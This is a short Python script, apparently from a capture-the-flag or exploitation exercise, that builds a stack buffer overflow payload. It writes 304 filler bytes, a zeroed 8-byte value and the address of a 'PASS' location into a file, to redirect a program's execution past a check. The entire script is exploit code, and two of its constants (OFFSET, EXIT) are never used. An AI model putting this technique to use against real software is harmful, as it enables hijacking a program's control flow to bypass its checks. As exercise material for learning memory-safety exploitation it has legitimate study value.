import struct
OFFSET  = 312
PASS    = 0x104e8  
EXIT = 0x1d8da   
payload = b'A' * 304         
payload += struct.pack('<Q', 0)        
payload += struct.pack('<Q', PASS)     

with open('payload', 'wb') as f:
    f.write(payload)